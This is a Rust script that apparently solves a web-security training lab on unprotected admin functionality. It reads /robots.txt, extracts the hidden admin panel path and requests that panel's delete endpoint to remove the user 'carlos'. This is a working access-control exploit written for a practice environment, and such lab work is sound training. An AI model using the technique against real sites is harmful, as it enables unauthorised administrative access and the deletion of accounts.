/********************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 4/9/2023
*
* Lab: Unprotected admin functionality
*
* Steps: 1. Fetch the /robots.txt file
*        2. Get the admin panel hidden path
*        3. Delete carlos
*
*********************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a6f0056030ea6b481cc9d8c00ac00d2.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    // fetch /robots.txt file
    print!("{} ", "1. Fetching /robots.txt file..".white());
    io::stdout().flush();
    let get_robots = client
        .get(format!("{url}/robots.txt"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch /robots.txt file".red()));
    println!("{}", "OK".green());

    // get the body of the response and extract the hidden name
    print!("{} ", "2. Extracting the hidden path..".white());
    io::stdout().flush();
    let body = get_robots.text().unwrap();
    let hidden_path = capture_pattern("Disallow: (.*)", &body).expect(&format!(
        "{}",
        "[!] Failed to extract the hidden path".red()
    ));
    println!("{} => {}", "OK".green(), hidden_path.yellow());

    // fetch the admin panel
    // this step in not necessary in the script, you can do step 4 directly
    // it's only a must when solving the lab using the browser
    print!("{} ", "3. Fetching the admin panel..".white());
    io::stdout().flush();
    let admin_panel = client
        .get(format!("{url}{hidden_path}"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
    println!("{}", "OK".green());

    // delete carlos
    print!("{} ", "4. Deleting carlos..".white());
    io::stdout().flush();
    let delete_carlos = client
        .get(format!("{url}{hidden_path}/delete?username=carlos"))
        .send()
        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
 * Function used to build the client
 * Return a client that will be used in all subsequent requests
 ********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}
